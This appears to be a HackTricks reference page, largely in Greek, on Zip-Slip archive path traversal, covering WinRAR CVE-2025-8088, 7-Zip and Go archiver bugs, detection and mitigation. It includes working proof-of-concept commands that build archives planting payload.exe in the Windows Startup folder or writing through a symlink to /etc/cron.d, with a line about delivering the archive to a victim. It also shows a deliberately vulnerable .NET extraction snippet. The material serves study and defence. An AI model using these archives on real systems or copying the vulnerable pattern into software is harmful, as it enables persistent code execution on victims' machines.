# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές μορφές archive (ZIP, RAR, TAR, 7-ZIP κ.λπ.) επιτρέπουν σε κάθε entry να περιέχει το δικό του **internal path**. Όταν ένα extraction utility ακολουθεί τυφλά αυτό το path, ένα crafted filename που περιέχει `..` ή ένα **absolute path** (π.χ. `C:\Windows\System32\`) θα εγγραφεί έξω από τον κατάλογο που επέλεξε ο χρήστης.
Αυτή η κατηγορία ευπαθειών είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Οι συνέπειες κυμαίνονται από την overwrite arbitrary files έως την άμεση επίτευξη **remote code execution (RCE)**, με την τοποθέτηση ενός payload σε μια θέση **auto-run**, όπως ο φάκελος *Startup* των Windows.

## Root Cause

1. Ο attacker δημιουργεί ένα archive στο οποίο ένα ή περισσότερα file headers περιέχουν:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ή crafted **symlinks** που επιλύονται έξω από το target dir (συνηθισμένο σε ZIP/TAR σε *nix).
2. Το victim κάνει extract το archive με ένα vulnerable tool που εμπιστεύεται το embedded path (ή ακολουθεί symlinks), αντί να το κάνει sanitise ή να επιβάλλει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
3. Το file εγγράφεται στην attacker-controlled location και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης ενεργοποιήσει αυτό το path.

### .NET `Path.Combine` + `ZipArchive` traversal

Ένα συνηθισμένο .NET anti-pattern είναι ο συνδυασμός του intended destination με το **user-controlled** `ZipArchiveEntry.FullName` και η εξαγωγή χωρίς path normalisation:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Αν το `entry.FullName` ξεκινά με `..\\`, πραγματοποιεί traversal· αν είναι **absolute path**, το αριστερό τμήμα απορρίπτεται πλήρως, με αποτέλεσμα ένα **arbitrary file write** ως identity της extraction.
- Archive proof-of-concept για εγγραφή σε έναν sibling κατάλογο `app` που παρακολουθείται από έναν scheduled scanner:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Η τοποθέτηση αυτού του ZIP στον monitored inbox έχει ως αποτέλεσμα τη δημιουργία του `C:\samples\app\0xdf.txt`, αποδεικνύοντας traversal εκτός του `C:\samples\queue\` και επιτρέποντας follow-on primitives (π.χ. DLL hijacks).

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

Το WinRAR για Windows (συμπεριλαμβανομένων των `rar` / `unrar` CLI, του DLL και του portable source) δεν επικύρωνε τα filenames κατά την extraction.
Ένα malicious RAR archive που περιέχει ένα entry όπως:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
θα κατέληγε **εκτός** του επιλεγμένου καταλόγου εξόδου και μέσα στον φάκελο *Startup* του χρήστη. Μετά τη σύνδεση, τα Windows εκτελούν αυτόματα όλα όσα βρίσκονται εκεί, παρέχοντας *persistent* RCE.<sup>[[5]](#references)</sup>

### Δημιουργία ενός PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – αποθηκεύει τα file paths ακριβώς όπως δίνονται (μην περικόπτετε τα αρχικά `./`).

Παραδώστε το `evil.rar` στο θύμα και instruct them to το εξαγάγουν με vulnerable WinRAR build.

### Παρατηρημένη Exploitation in the Wild

Η ESET ανέφερε spear-phishing campaigns της RomCom (Storm-0978/UNC2596), οι οποίες επισύναπταν RAR archives που εκμεταλλεύονταν το CVE-2025-8088 για την ανάπτυξη customised backdoors και τη διευκόλυνση ransomware operations.<sup>[[5]](#references)</sup>

## Νεότερες περιπτώσεις (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: Τα ZIP entries που ήταν **symbolic links** γίνονταν dereference κατά την extraction, επιτρέποντας στους attackers να διαφύγουν από το destination directory και να κάνουν overwrite arbitrary paths. Η αλληλεπίδραση του χρήστη περιορίζεται στο *άνοιγμα/extraction* του archive.<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Διορθώθηκε στην **25.00** (Ιούλιος 2025) και σε νεότερες εκδόσεις.
* **Impact path**: Κάντε overwrite το `Start Menu/Programs/Startup` ή service-run locations → ο κώδικας εκτελείται στο επόμενο logon ή service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Σε patched build το `/etc/cron.d` δεν θα τροποποιηθεί· το symlink θα γίνει extracted ως link μέσα στο /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: Η `archiver.Unarchive()` ακολουθεί `../` και symlinked ZIP entries, γράφοντας εκτός του `outputDir`.<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (το project είναι πλέον deprecated).
* **Fix**: Μεταβείτε στο `mholt/archives` ≥ 0.1.0 ή υλοποιήστε canonical-path checks πριν από το write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Συμβουλές Detection

* **Static inspection** – Παραθέστε τα archive entries και επισημάνετε οποιοδήποτε name περιέχει `../`, `..\\`, *absolute paths* (`/`, `C:`) ή entries τύπου *symlink* των οποίων το target βρίσκεται εκτός του extraction dir.
* **Canonicalisation** – Βεβαιωθείτε ότι το `realpath(join(dest, name))` εξακολουθεί να ξεκινά με `dest`. Σε διαφορετική περίπτωση, απορρίψτε το.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Κάντε decompress σε disposable directory χρησιμοποιώντας έναν *safe* extractor (π.χ. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) και επαληθεύστε ότι τα resulting paths παραμένουν μέσα στο directory.
* **Endpoint monitoring** – Δημιουργήστε alert για νέα executables που γράφονται σε `Startup`/`Run`/`cron` locations λίγο μετά το άνοιγμα ενός archive από WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Ενημερώστε τον extractor** – Τα WinRAR 7.13+ και 7-Zip 25.00+ υλοποιούν path/symlink sanitisation. Και τα δύο tools εξακολουθούν να μην διαθέτουν auto-update.
2. Όταν είναι δυνατό, κάντε extract τα archives με “**Do not extract paths**” / “**Ignore paths**”.
3. Σε Unix, κάντε drop privileges και κάντε mount ένα **chroot/namespace** πριν από την extraction· στα Windows, χρησιμοποιήστε **AppContainer** ή sandbox.
4. Αν γράφετε custom code, κάντε normalise με `realpath()`/`PathCanonicalize()` **πριν** από create/write και απορρίψτε οποιοδήποτε entry διαφεύγει από το destination.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory από τη Snyk που επηρέασε πολλές Java/Go/JS libraries.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, παρόμοιο traversal κατά το `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377), TAR extraction traversal σε slugs (patch στο v1.2).<sup>[[7]](#references)</sup>
* Οποιαδήποτε custom extraction logic που δεν καλεί `PathCanonicalize` / `realpath` πριν από το write.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
